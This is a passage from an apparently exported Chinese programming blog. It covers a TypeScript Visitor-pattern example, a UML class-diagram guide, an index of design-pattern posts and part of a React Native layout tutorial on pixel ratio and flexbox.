<h5 id="Computer-ts-计算机实体类"><a href="#Computer-ts-计算机实体类" class="headerlink" title="Computer.ts 计算机实体类"></a>Computer.ts 计算机实体类</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; ComputerPartVisitor &#125; from &quot;.&#x2F;ComputerPartVisitor&quot;;</span><br><span class="line">import Mouse from &quot;.&#x2F;Mouse&quot;;</span><br><span class="line">import Keyboard from &quot;.&#x2F;Keyboard&quot;;</span><br><span class="line">import Monitor from &quot;.&#x2F;Monitor&quot;;</span><br><span class="line">import &#123; ComputerPart &#125; from &quot;.&#x2F;ComputerPart&quot;;</span><br><span class="line"></span><br><span class="line">export default class Computer implements ComputerPart &#123;</span><br><span class="line"></span><br><span class="line">    private parts: ComputerPart[];</span><br><span class="line">    public name: string;</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        this.parts &#x3D; [new Mouse(), new Keyboard(), new Monitor()];</span><br><span class="line">        this.name &#x3D; &quot;Computer&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public accept(computerPartVisitor: ComputerPartVisitor): void &#123;</span><br><span class="line">        for (let i &#x3D; 0; i &lt; this.parts.length; i++) &#123;</span><br><span class="line">            this.parts[i].accept(computerPartVisitor);</span><br><span class="line">        &#125;</span><br><span class="line">        computerPartVisitor.visit(this);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="ComputerPartVisitor-ts-访问者的接口"><a href="#ComputerPartVisitor-ts-访问者的接口" class="headerlink" title="ComputerPartVisitor.ts 访问者的接口"></a>ComputerPartVisitor.ts 访问者的接口</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Computer from &quot;.&#x2F;Computer&quot;;</span><br><span class="line">import Mouse from &quot;.&#x2F;Mouse&quot;;</span><br><span class="line">import Keyboard from &quot;.&#x2F;Keyboard&quot;;</span><br><span class="line">import Monitor from &quot;.&#x2F;Monitor&quot;;</span><br><span class="line"></span><br><span class="line">export interface ComputerPartVisitor &#123;</span><br><span class="line">    visit(obj: Computer | Mouse | Keyboard | Monitor): void;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="ComputerPartDisplayVisitor-ts-创建实现了上述类的实体访问者。"><a href="#ComputerPartDisplayVisitor-ts-创建实现了上述类的实体访问者。" class="headerlink" title="ComputerPartDisplayVisitor.ts 创建实现了上述类的实体访问者。"></a>ComputerPartDisplayVisitor.ts 创建实现了上述类的实体访问者。</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; ComputerPartVisitor &#125; from &quot;.&#x2F;ComputerPartVisitor&quot;;</span><br><span class="line">import Computer from &quot;.&#x2F;Computer&quot;;</span><br><span class="line">import Mouse from &quot;.&#x2F;Mouse&quot;;</span><br><span class="line">import Keyboard from &quot;.&#x2F;Keyboard&quot;;</span><br><span class="line">import Monitor from &quot;.&#x2F;Monitor&quot;;</span><br><span class="line"></span><br><span class="line">export default class ComputerPartDisplayVisitor implements ComputerPartVisitor &#123;</span><br><span class="line">    public visit(obj: Computer | Mouse | Keyboard | Monitor): void &#123;&#x2F;&#x2F;JavaScript中没有重载</span><br><span class="line">        console.log(obj.name)</span><br><span class="line">        if (obj.name &#x3D;&#x3D;&#x3D; &quot;Computer&quot;) &#123;</span><br><span class="line">            console.log(&quot;Displaying Computer.&quot;);</span><br><span class="line"></span><br><span class="line">        &#125; else if (obj.name &#x3D;&#x3D;&#x3D; &quot;Mouse&quot;) &#123;</span><br><span class="line"></span><br><span class="line">            console.log(&quot;Displaying Mouse.&quot;);</span><br><span class="line">        &#125; else if (obj.name &#x3D;&#x3D;&#x3D; &quot;Keyboard&quot;) &#123;</span><br><span class="line"></span><br><span class="line">            console.log(&quot;Displaying Keyboard.&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            console.log(&quot;Displaying Monitor.&quot;);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="index-ts"><a href="#index-ts" class="headerlink" title="index.ts"></a>index.ts</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; ComputerPart &#125; from &quot;.&#x2F;ComputerPart&quot;;</span><br><span class="line">import Computer from &quot;.&#x2F;Computer&quot;;</span><br><span class="line">import ComputerPartDisplayVisitor from &quot;.&#x2F;ComputerPartDisplayVisitor&quot;;</span><br><span class="line"></span><br><span class="line">const computer: ComputerPart &#x3D; new Computer();</span><br><span class="line">computer.accept(new ComputerPartDisplayVisitor());</span><br></pre></td></tr></table></figure>
<h5 id="result"><a href="#result" class="headerlink" title="result"></a>result</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mouse</span><br><span class="line">Displaying Mouse.</span><br><span class="line">Keyboard</span><br><span class="line">Displaying Keyboard.</span><br><span class="line">Monitor</span><br><span class="line">Displaying Monitor.</span><br><span class="line">Computer</span><br><span class="line">Displaying Computer.</span><br></pre></td></tr></table></figure>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://upload-images.jianshu.io/upload_images/10024246-23af8b73c70c1911.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h2 id="角色"><a href="#角色" class="headerlink" title="角色"></a>角色</h2><ul>
<li>Visitor(访问者)<br>Visitor角色负责对数据结构中每个具体的元素声明一个访问的visit方法，visit方法是用来操作元素的方法，负责实现该方法的是concreteVisitor角色</li>
<li>ConcreteVisitor（具体的访问者）<br>ConcreteVisitor角色负责实现Visitor角色定影的接口，它要实现所有的visit方法，即实现如何处理每个ConcreteElement角色。ConcreteVisitor角色的内部状态会随着visit的变化而变化</li>
<li>Element（元素）<br>Element角色表示Visitor角色的访问对象。它声明了接受访问者的accept方法。accept方法接受的参数是Visitor角色。</li>
<li>ConcreteElement<br>ConcreteElement负责实现Element角色定义的接口</li>
<li>ObjectStructure（对象结构）<br>ObjectStructure角色负责吃力Element角色的集合。ConcreteVisitor角色为每个Element都准备了处理方法。</li>
</ul>
]]></content>
      <categories>
        <category>DesignPattern</category>
      </categories>
  </entry>
  <entry>
    <title>完结感想</title>
    <url>/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/%E5%AE%8C%E7%BB%93%E6%84%9F%E6%83%B3/</url>
    <content><![CDATA[<p>从2020.03.28到2021.01.11接近一年的时间才完成这个系列，还是有很多感触的。</p>
<p>现在一直在用TS开发，TS解决了以前JS虽然是面向对象的语言，但是和java、C、PHP这种强类型的语言相比，没有明确的class，interface这些面向对象的定义，想做一些设计模式的开发就会写的不伦不类，有了TS终于能够写真正的面向对象的代码了。</p>
<p>自从拿到看到关于《设计模式》这本书，就想写一下用TS来实现相关设计模式的想法，顺便复习下相关内容，本来计划1、2个月就能完成这件事，但是计划赶不上变化，其实就是拖延症，前面几分钟热度，后来就是给自己找各种理由，根本没写几个。</p>
<p>直到最近碰到了日更活动，为了给自己一定的压力，就参与进去，才发现人的潜力是无穷的，逼一逼还是有潜力可挖的。🤩</p>
]]></content>
      <categories>
        <category>DesignPattern</category>
      </categories>
  </entry>
  <entry>
    <title>设计模式之UML类图</title>
    <url>/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E4%B9%8BUML%E7%B1%BB%E5%9B%BE/</url>
    <content><![CDATA[<h2 id="类图："><a href="#类图：" class="headerlink" title="类图："></a>类图：</h2><p>在类图中一共包含了以下几种模型元素，分别是：类（Class）、接口（Interface）以及类之间的关系。</p>
<h5 id="1、类（Class"><a href="#1、类（Class" class="headerlink" title="1、类（Class)"></a>1、类（Class)</h5><p>　　在面向对象（OO) 编程中，类是对现实世界中一组具有相同特征的物体的抽象。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-8bbcf2cb154f0512.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<h5 id="2、-接口（Interface）"><a href="#2、-接口（Interface）" class="headerlink" title="2、 接口（Interface）"></a>2、 接口（Interface）</h5><p>　　接口是一种特殊的类，具有类的结构但不可被实例化，只可以被实现（继承）。在UML中，接口使用一个带有名称的小圆圈来进行表示。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-de1b5d4397a635a9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<h5 id="3、类图中关系（relation）"><a href="#3、类图中关系（relation）" class="headerlink" title="3、类图中关系（relation）"></a>3、类图中关系（relation）</h5><p>在UML类图中，常见的有以下几种关系: </p>
<ul>
<li>泛化（Generalization）</li>
<li>实现（Realization）</li>
<li>关联（Association)</li>
<li>聚合（Aggregation）</li>
<li>组合(Composition)</li>
<li>依赖(Dependency)</li>
</ul>
<h5 id="3-1-泛化（Generalization）"><a href="#3-1-泛化（Generalization）" class="headerlink" title="3.1 泛化（Generalization）"></a>3.1 泛化（Generalization）</h5><p>【泛化关系】：是一种继承关系，表示一般与特殊的关系，它指定了子类如何特化父类的所有特征和行为。</p>
<p>例如：老虎是动物的一种，即有老虎的特性也有动物的共性。</p>
<p>【箭头指向】：带三角箭头的实线，箭头指向父类</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-029720a88a5da64a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="泛化"></p>
<h5 id="3-2-实现（Realization）"><a href="#3-2-实现（Realization）" class="headerlink" title="3.2 实现（Realization）"></a>3.2 实现（Realization）</h5><p>【实现关系】：是一种类与接口的关系，表示类是接口所有特征和行为的实现.</p>
<p>【箭头指向】：带三角箭头的虚线，箭头指向接口</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-a3ae84ab7432ba6c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="实现"></p>
<h5 id="3-3-关联（Association"><a href="#3-3-关联（Association" class="headerlink" title="3.3 关联（Association)"></a>3.3 关联（Association)</h5><p>1、关联关系</p>
<p>关联关系又可进一步分为单向关联、双向关联和自关联。</p>
<p>（1）单向关联</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-b7da7cefc1e8a965.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<p>我们可以看到，在UML类图中单向关联用一个带箭头的直线表示。上图表示每个顾客都有一个地址，这通过让Customer类持有一个类型为Address的成员变量类实现。</p>
<p>（2）双向关联</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-8a5ab4ef3ea8fca7.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<p>从上图中我们很容易看出，所谓的双向关联就是双方各自持有对方类型的成员变量。在UML类图中，双向关联用一个不带箭头的直线表示。上图中在Customer类中维护一个Product[]数组，表示一个顾客购买了那些产品；在Product类中维护一个Customer类型的成员变量表示这个产品被哪个顾客所购买。</p>
<p>（3）自关联</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-d105b28536055929.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<p>自关联在UML类图中用一个带有箭头且指向自身的直线表示。上图的意思就是Node类包含类型为Node的成员变量，也就是“自己包含自己”。</p>
<blockquote>
<p><strong>依赖和关联区别：</strong><br><em>用锤子修了一下桌子，我和锤子之间就是一种依赖，我和我的同事就是一种关联。<br>依赖是一种弱关联，只要一个类用到另一个类，但是和另一个类的关系不是太明显的时候（可以说是“uses”了那个类），就可以把这种关系看成是依赖，依赖也可说是一种偶然的关系，而不是必然的关系。<br>关联是类之间的一种关系，例如老师教学生，老公和老婆这种关系是非常明显的。依赖是比较陌生，关联是我们已经认识熟悉了。</em></p>
</blockquote>
<h5 id="3-4-聚合（Aggregation）"><a href="#3-4-聚合（Aggregation）" class="headerlink" title="3.4 聚合（Aggregation）"></a>3.4 聚合（Aggregation）</h5><p>【聚合关系】：是整体与部分的关系，且部分可以离开整体而单独存在。</p>
<p>如车和轮胎是整体和部分的关系，轮胎离开车仍然可以存在。</p>
<p>聚合关系是关联关系的一种，是强的关联关系；关联和聚合在语法上无法区分，必须考察具体的逻辑关系。</p>
<p>【代码体现】：成员变量</p>
<p>【箭头及指向】：带空心菱形的实心线，菱形指向整体</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-5e72b3273da1726a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
<h5 id="3-5-组合-Composition"><a href="#3-5-组合-Composition" class="headerlink" title="3.5 组合(Composition)"></a>3.5 组合(Composition)</h5><p>【组合关系】：是整体与部分的关系，但部分不能离开整体而单独存在。</p>
<p>如公司和部门是整体和部分的关系，没有公司就不存在部门。</p>
<p>组合关系是关联关系的一种，是比聚合关系还要强的关系，</p>
<p>它要求普通的聚合关系中代表整体的对象负责代表部分的对象的生命周期。</p>
<p>【代码体现】：成员变量</p>
<p>【箭头及指向】：带实心菱形的实线，菱形指向整体</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-f091bcde6b547433.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
<h5 id="3-6-依赖-Dependency"><a href="#3-6-依赖-Dependency" class="headerlink" title="3.6 依赖(Dependency)"></a>3.6 依赖(Dependency)</h5><p>【依赖关系】：是一种使用的关系，即一个类的实现需要另一个类的协助，</p>
<p>所以要尽量不使用双向的互相依赖.</p>
<p>【代码表现】：局部变量、方法的参数或者对静态方法的调用</p>
<p>【箭头及指向】：带箭头的虚线，指向被使用者</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-4b696f117362a3ff.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
<p>各种关系的强弱顺序：</p>
<p>泛化 = 实现 &gt; 组合 &gt; 聚合 &gt; 关联 &gt; 依赖</p>
<p>下面这张UML图，比较形象地展示了各种类图关系：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-f8c0a29ab9d7ffa4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<p><strong>类图绘制的要点</strong></p>
<ul>
<li>类的操作是针对类自身的操作，而不是它去操作人家。比如书这个类有上架下架的操作，是书自己被上架下架，不能因为上架下架是管理员的动作而把它放在管理员的操作里。</li>
<li>两个相关联的类，需要在关联的类中加上被关联类的ID，并且箭头指向被关联类。可以理解为数据表中的外键。比如借书和书，借书需要用到书的信息，因此借书类需包含书的ID，箭头指向书。</li>
<li>由于业务复杂性，一个显示中的实体可能会被分为多个类，这是很正常的，类不是越少越好。类的设计取决于怎样让后台程序的操作更加简单。比如单看逻辑，借书类可以不存在，它的信息可以放在书这个类里。然而借还书和书的上架下架完全不是一回事，借书类对借书的操作更加方便，不需要去重复改动书这个类中的内容。此外，如果书和借书是1对多的关系，那就必须分为两个类。</li>
<li>类图中的规范问题，比如不同关系需要不同的箭头，可见性符号等。</li>
</ul>
]]></content>
      <categories>
        <category>DesignPattern</category>
      </categories>
  </entry>
  <entry>
    <title>设计模式分类</title>
    <url>/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%88%86%E7%B1%BB/</url>
    <content><![CDATA[<h2 id="创建型设计模式"><a href="#创建型设计模式" class="headerlink" title="创建型设计模式"></a>创建型设计模式</h2><ul>
<li><a href="/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Abstract-Factory-Pattern%EF%BC%88%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F%EF%BC%89">Abstract Factory模式</a></li>
<li><a href="/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Builder-Pattern%EF%BC%88%E5%BB%BA%E9%80%A0%E8%80%85%E6%A8%A1%E5%BC%8F%EF%BC%89">Builder模式</a></li>
<li><a href="/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Factory-Method(%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F)">Factory Method模式</a></li>
<li><a href="/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Prototype-Pattern(%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F%EF%BC%89">Prototype模式</a></li>
<li><a href="/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Singleton%E6%A8%A1%E5%BC%8F">Singleton模式</a><h2 id="结构型设计模式"><a href="#结构型设计模式" class="headerlink" title="结构型设计模式"></a>结构型设计模式</h2></li>
<li><a href="/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Adapter%E6%A8%A1%E5%BC%8F%EF%BC%88%E9%80%82%E9%85%8D%E5%99%A8%EF%BC%89">Adapter模式</a></li>
<li><a href="/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Bridge-Pattern%EF%BC%88%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F%EF%BC%89">Bridge模式</a></li>
<li><a href="/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Composite%E6%A8%A1%E5%BC%8F%EF%BC%88%E7%BB%84%E5%90%88%E5%AE%9E%E4%BD%93%E6%A8%A1%E5%BC%8F%EF%BC%89">Composite模式</a></li>
<li><a href="/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Decorator%E6%A8%A1%E5%BC%8F%EF%BC%88%E8%A3%85%E9%A5%B0%E5%99%A8%E6%A8%A1%E5%BC%8F%EF%BC%89">Decorator模式</a></li>
<li><a href="/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Facade%E6%A8%A1%E5%BC%8F%EF%BC%88%E9%97%A8%E9%9D%A2%E6%A8%A1%E5%BC%8F%EF%BC%89">Facade模式</a></li>
<li><a href="/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Flyweight-Pattern(%E4%BA%AB%E5%85%83%E6%A8%A1%E5%BC%8F)">Flyweight模式</a></li>
<li><a href="/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Proxy-Pattern(%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F)">Proxy模式</a><h2 id="行为性设计模式"><a href="#行为性设计模式" class="headerlink" title="行为性设计模式"></a>行为性设计模式</h2></li>
<li><a href="/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Chain-of-Responsibility%E6%A8%A1%E5%BC%8F%EF%BC%88%E8%B4%A3%E4%BB%BB%E9%93%BE%E6%A8%A1%E5%BC%8F%EF%BC%89">Chain of Responsibility模式</a></li>
<li><a href="/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Command%E6%A8%A1%E5%BC%8F%EF%BC%88%E5%91%BD%E4%BB%A4%E6%A8%A1%E5%BC%8F%EF%BC%89">Command模式</a></li>
<li><a href="/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Interpreter-Pattern(%E8%A7%A3%E9%87%8A%E5%99%A8%E6%A8%A1%E5%BC%8F%EF%BC%89">Interpreter模式</a></li>
<li><a href="/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Iterator%E6%A8%A1%E5%BC%8F">Iterator模式</a></li>
<li><a href="/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Mediator%E6%A8%A1%E5%BC%8F%EF%BC%88%E4%B8%AD%E4%BB%8B%E8%80%85%E6%A8%A1%E5%BC%8F%EF%BC%89">Mediator模式</a></li>
<li><a href="/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Memento-Pattern%EF%BC%88%E5%A4%87%E5%BF%98%E5%BD%95%E6%A8%A1%E5%BC%8F%EF%BC%89">Memento模式</a></li>
<li><a href="/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Observer%E6%A8%A1%E5%BC%8F%EF%BC%88%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F%EF%BC%89">Observer模式</a></li>
<li><a href="/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/State-Pattern%E6%A8%A1%E5%BC%8F%EF%BC%88%E7%8A%B6%E6%80%81%E6%A8%A1%E5%BC%8F%EF%BC%89">State模式</a></li>
<li><a href="/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Strategy-Pattern%E6%A8%A1%E5%BC%8F%EF%BC%88%E7%AD%96%E7%95%A5%E6%A8%A1%E5%BC%8F%EF%BC%89">Strategy模式</a></li>
<li><a href="/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Template-Method%EF%BC%88%E6%A8%A1%E6%9D%BF%E6%96%B9%E6%B3%95%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%89">Template Method模式</a></li>
<li><a href="/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Visitor-Pattern(%E8%AE%BF%E9%97%AE%E8%80%85%E6%A8%A1%E5%BC%8F)">Visitor模式</a></li>
</ul>
]]></content>
      <categories>
        <category>DesignPattern</category>
      </categories>
  </entry>
  <entry>
    <title></title>
    <url>/nirvana/uncategorized/react-native/react-native%E5%B8%83%E5%B1%80/</url>
    <content><![CDATA[<hr>
<p>title: react-native布局<br>date: 2021-03-11 21:12:40<br>category: reactnative—</p>
<h2 id="宽度单位和像素密度"><a href="#宽度单位和像素密度" class="headerlink" title="宽度单位和像素密度"></a>宽度单位和像素密度</h2><p>react 的宽度不支持百分比，设置宽度时不需要带单位 <code>&#123;width: 10&#125;</code>， 那么 10 代表的具体宽度是多少呢？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var Dimensions &#x3D; require(&#39;Dimensions&#39;);</span><br><span class="line">    &lt;Text style&#x3D;&#123;styles.welcome&#125;&gt;</span><br><span class="line">          window.width&#x3D;&#123;Dimensions.get(&#39;window&#39;).width + &#39;\n&#39;&#125; </span><br><span class="line">          window.height&#x3D;&#123;Dimensions.get(&#39;window&#39;).height + &#39;\n&#39;&#125; </span><br><span class="line">          pxielRatio&#x3D;&#123;PixelRatio.get()&#125;</span><br><span class="line">    &lt;&#x2F;Text&gt; </span><br></pre></td></tr></table></figure>

<p>默认用的是 iphone6 的模拟器结果是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">window.width&#x3D;375</span><br><span class="line">    window.height&#x3D;667</span><br><span class="line">    pxielRatio&#x3D;2</span><br></pre></td></tr></table></figure>

<p>我们知道 iphone 系列的尺寸如下图：</p>
<p><img src="http://upload-images.jianshu.io/upload_images/10024246-0bc6c802496c032e.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-e64ac35f00c55099.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>可以看到 iphone 6 的宽度为 375pt，对应了上边的 375，由此可见 react 的单位为 pt。 那如何获取实际的像素尺寸呢？ 这对图片的高清化很重要，如果我的图片大小为 100*100 px. 设置宽度为 100 * 100. 那在 iphone 上的尺寸就是模糊的。 这个时候需要的图像大小应该是 100 * pixelRatio 的大小 。</p>
<p>react 提供了 PixelRatio 的获取方式<a href="https://facebook.github.io/react-native/docs/pixelratio.html">https://facebook.github.io/react-native/docs/pixelratio.html</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var image &#x3D; getImage(&#123;</span><br><span class="line">  width: 200 * PixelRatio.get(),</span><br><span class="line">  height: 100 * PixelRatio.get()</span><br><span class="line">&#125;);</span><br><span class="line">&lt;Image source&#x3D;&#123;image&#125; style&#x3D;&#123;&#123;width: 200, height: 100&#125;&#125; &#x2F;&gt;</span><br></pre></td></tr></table></figure>

<h2 id="flex-的布局"><a href="#flex-的布局" class="headerlink" title="flex 的布局"></a>flex 的布局</h2><h3 id="默认宽度"><a href="#默认宽度" class="headerlink" title="默认宽度"></a>默认宽度</h3><p>我们知道一个 div 如果不设置宽度，默认的会占用 100% 的宽度， 为了验证 100% 这个问题， 做三个实验</p>
<ol>
<li> 根节点上方一个 View， 不设置宽度</li>
<li> 固定宽度的元素上设置一个 View， 不设置宽度</li>
<li> flex 的元素上放一个 View 宽度， 不设置宽度</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Text style&#x3D;&#123;[styles.text, styles.header]&#125;&gt;</span><br><span class="line">     根节点上放一个元素，不设置宽度 </span><br><span class="line"> &lt;&#x2F;Text&gt;        </span><br><span class="line"></span><br><span class="line"> &lt;View style&#x3D;&#123;&#123;height: 20, backgroundColor: &#39;#333333&#39;&#125;&#125; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line"> &lt;Text style&#x3D;&#123;[styles.text, styles.header]&#125;&gt;</span><br><span class="line">     固定宽度的元素上放一个 View，不设置宽度 </span><br><span class="line"> &lt;&#x2F;Text&gt; </span><br><span class="line"></span><br><span class="line"> &lt;View style&#x3D;&#123;&#123;width: 100&#125;&#125;&gt;</span><br><span class="line">   &lt;View style&#x3D;&#123;&#123;height: 20, backgroundColor: &#39;#333333&#39;&#125;&#125; &#x2F;&gt;</span><br><span class="line"> &lt;&#x2F;View&gt;</span><br><span class="line"></span><br><span class="line"> &lt;Text style&#x3D;&#123;[styles.text, styles.header]&#125;&gt;</span><br><span class="line">     flex 的元素上放一个 View，不设置宽度 </span><br><span class="line"> &lt;&#x2F;Text&gt; </span><br><span class="line"></span><br><span class="line"> &lt;View style&#x3D;&#123;&#123;flexDirection: &#39;row&#39;&#125;&#125;&gt;</span><br><span class="line">   &lt;View style&#x3D;&#123;&#123;flex: 1&#125;&#125;&gt;</span><br><span class="line">     &lt;View style&#x3D;&#123;&#123;height: 20, backgroundColor: &#39;#333333&#39;&#125;&#125; &#x2F;&gt;</span><br><span class="line">   &lt;&#x2F;View&gt;</span><br><span class="line">   &lt;View style&#x3D;&#123;&#123;flex: 1&#125;&#125;&#x2F;&gt;</span><br><span class="line"> &lt;&#x2F;View&gt;</span><br></pre></td></tr></table></figure>

<p><img src="http://upload-images.jianshu.io/upload_images/10024246-e57320a321d1c847.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<p>结果可以看到 flex 的元素如果不设置宽度， 都会百分之百的占满父容器。</p>
<h3 id="水平垂直居中"><a href="#水平垂直居中" class="headerlink" title="水平垂直居中"></a>水平垂直居中</h3><p>css 里边经常会做的事情是去讲一个文本或者图片水平垂直居中，如果使用过 css 的 flexbox 当然知道使用<code>alignItems</code> 和 <code>justifyContent</code> . 那用 react-native 也来做一下实验</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Text style&#x3D;&#123;[styles.text, styles.header]&#125;&gt;</span><br><span class="line">        水平居中 </span><br><span class="line">    &lt;&#x2F;Text&gt;</span><br><span class="line"></span><br><span class="line">    &lt;View style&#x3D;&#123;&#123;height: 100, backgroundColor: &#39;#333333&#39;, alignItems: &#39;center&#39;&#125;&#125;&gt;</span><br><span class="line">      &lt;View style&#x3D;&#123;&#123;backgroundColor: &#39;#fefefe&#39;, width: 30, height: 30, borderRadius: 15&#125;&#125;&#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;View&gt;</span><br><span class="line"></span><br><span class="line">     &lt;Text style&#x3D;&#123;[styles.text, styles.header]&#125;&gt;</span><br><span class="line">        垂直居中 </span><br><span class="line">    &lt;&#x2F;Text&gt;</span><br><span class="line">    &lt;View style&#x3D;&#123;&#123;height: 100, backgroundColor: &#39;#333333&#39;, justifyContent: &#39;center&#39;&#125;&#125;&gt;</span><br><span class="line">      &lt;View style&#x3D;&#123;&#123;backgroundColor: &#39;#fefefe&#39;, width: 30, height: 30, borderRadius: 15&#125;&#125;&#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;View&gt;</span><br><span class="line"></span><br><span class="line">    